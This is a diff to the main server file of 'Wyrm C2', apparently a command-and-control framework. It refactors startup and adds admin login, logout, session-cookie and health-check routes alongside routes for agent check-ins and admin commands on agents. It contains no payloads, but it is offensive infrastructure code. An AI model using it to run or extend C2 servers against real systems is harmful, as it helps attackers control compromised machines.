@@ -1,6 +1,8 @@
+#![feature(map_try_insert)]
+
 use core::panic;
 use std::{
-    env::current_dir, fs::create_dir, net::SocketAddr, panic::set_hook, path::PathBuf, sync::Arc,
+    fs::create_dir, net::SocketAddr, panic::set_hook, path::PathBuf, sync::Arc, time::Duration,
 };
 
 use api::{handle_agent_get, handle_agent_post};
@@ -11,21 +13,25 @@ use axum::{
     routing::{get, post},
     serve,
 };
+
 use shared::{
-    net::{ADMIN_ENDPOINT, NOTIFICATION_CHECK_AGENT_ENDPOINT},
+    net::{
+        ADMIN_ENDPOINT, ADMIN_HEALTH_CHECK_ENDPOINT, ADMIN_LOGIN_ENDPOINT,
+        NOTIFICATION_CHECK_AGENT_ENDPOINT,
+    },
     pretty_print::{print_info, print_success},
 };
 
 use crate::{
     api::{
-        build_all_binaries_handler, handle_admin_commands_on_agent,
+        admin_login, build_all_binaries_handler, handle_admin_commands_on_agent,
         handle_admin_commands_without_agent, handle_agent_get_with_path,
-        handle_agent_post_with_path, poll_agent_notifications,
+        handle_agent_post_with_path, is_adm_logged_in, logout, poll_agent_notifications,
     },
     app_state::{AppState, detect_stale_agents},
     db::Db,
     logging::log_error,
-    middleware::{authenticate_admin, authenticate_agent_by_header_token},
+    middleware::{authenticate_admin, authenticate_agent_by_header_token, logout_middleware},
     profiles::parse_profiles,
 };
 
@@ -46,6 +52,9 @@ mod timestomping;
 const NUM_GIGS: usize = 1;
 const MAX_POST_BODY_SZ: usize = NUM_GIGS * 1024 * 1024 * 1024;
 
+const AUTH_COOKIE_NAME: &str = "session";
+const COOKIE_TTL: Duration = Duration::from_hours(12);
+
 /// The path to the directory on the server (relative to the working directory of the service [n.b. this
 /// implies the server was 'installed' correctly..])
 const FILE_STORE_PATH: &str = "/data/staged_files";
@@ -58,9 +67,46 @@ const ERROR_LOG: &str = "error.log";
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    //
+    // Initialise the state of the C2, including checking the filesystem, database, etc.
+    //
+    let state = init_server_state().await;
+
+    //
+    // Build the router and serve content
+    //
+    let app = build_routes(state.clone());
+    let listener = tokio::net::TcpListener::bind(construct_listener_addr()).await?;
+
+    print_success(format!(
+        "Wyrm C2 started on: {}",
+        listener.local_addr().unwrap()
+    ));
+
+    serve(
+        listener,
+        app.into_make_service_with_connect_info::<SocketAddr>(),
+    )
+    .await?;
+
+    print_info("Server closed.");
+
+    Ok(())
+}
+
+fn construct_listener_addr() -> String {
+    let port = std::env::var("C2_PORT").expect("could not find C2_PORT environment variable");
+    let port: u16 = port
+        .parse()
+        .expect("could not parse port number to valid range");
+    let c2_host = std::env::var("C2_HOST").expect("could not find C2_HOST environment variable");
+
+    format!("{c2_host}:{port}")
+}
+
+async fn init_server_state() -> Arc<AppState> {
     print_info("Starting Wyrm C2.");
 
-    // if this fails, panic is ok
     let profile = match parse_profiles().await {
         Ok(p) => p,
         Err(e) => {
@@ -68,22 +114,30 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     };
 
-    print_info("Profiles parsed.");
+    print_success("Profiles parsed.");
 
-    // Set a panic hook for logging unwraps, expects, panics, etc.
     set_panic_hook();
-
-    // Build any paths on disk we need
     ensure_dirs_and_files();
-
-    print_info("Directories and files checked.");
 
     let pool = Db::new().await;
     let state = Arc::new(AppState::from(pool, profile).await);
 
-    let app = Router::new()
+    //
+    // Kick off automations that run on the server
+    //
+    state.track_sessions();
+    let state_cl = state.clone();
+    tokio::task::spawn(async move { detect_stale_agents(state_cl).await });
+
+    state
+}
+
+fn build_routes(state: Arc<AppState>) -> Router {
+    Router::new()
+        //
         //
         // PUBLIC ROUTES
+        //
         //
         .route(
             "/",
@@ -115,14 +169,21 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             )),
         )
         //
+        //
         // ADMIN ROUTES
         //
+        //
+        .route(
+            "/logout_admin",
+            post(logout).layer(from_fn_with_state(state.clone(), logout_middleware)),
+        )
         // Build all binaries path
         .route(
             "/admin_bab",
             post(build_all_binaries_handler)
                 .layer(from_fn_with_state(state.clone(), authenticate_admin)),
         )
+        .route(&format!("/{ADMIN_LOGIN_ENDPOINT}"), post(admin_login))
         // Admin endpoint when operating a command which is not related to a specific agent
         .route(
             &format!("/{ADMIN_ENDPOINT}"),
@@ -141,36 +202,16 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             get(poll_agent_notifications)
                 .layer(from_fn_with_state(state.clone(), authenticate_admin)),
         )
+        // A route for admin poll to check if logged in on the GUI
+        .route(
+            ADMIN_HEALTH_CHECK_ENDPOINT,
+            get(is_adm_logged_in).layer(from_fn_with_state(state.clone(), authenticate_admin)),
+        )
         //
         // 1 GB for POST max ?
         //
         .layer(DefaultBodyLimit::max(MAX_POST_BODY_SZ))
-        .with_state(state.clone());
-
-    tokio::task::spawn(async move { detect_stale_agents(state.clone()).await });
-
-    let port = std::env::var("C2_PORT").expect("could not find C2_PORT environment variable");
-    let port: u16 = port
-        .parse()
-        .expect("could not parse port number to valid range");
-    let c2_host = std::env::var("C2_HOST").expect("could not find C2_HOST environment variable");
-
-    let listener = tokio::net::TcpListener::bind(&format!("{c2_host}:{port}")).await?;
-
-    print_success(format!(
-        "Wyrm C2 started on: {}",
-        listener.local_addr().unwrap()
-    ));
-
-    serve(
-        listener,
-        app.into_make_service_with_connect_info::<SocketAddr>(),
-    )
-    .await?;
-
-    print_info("Server closed.");
-
-    Ok(())
+        .with_state(state.clone())
 }
 
 fn ensure_dirs_and_files() {
@@ -241,6 +282,8 @@ fn ensure_dirs_and_files() {
             }
         }
     }
+
+    print_success("Directories and files are in order..");
 }
 
 fn set_panic_hook() {
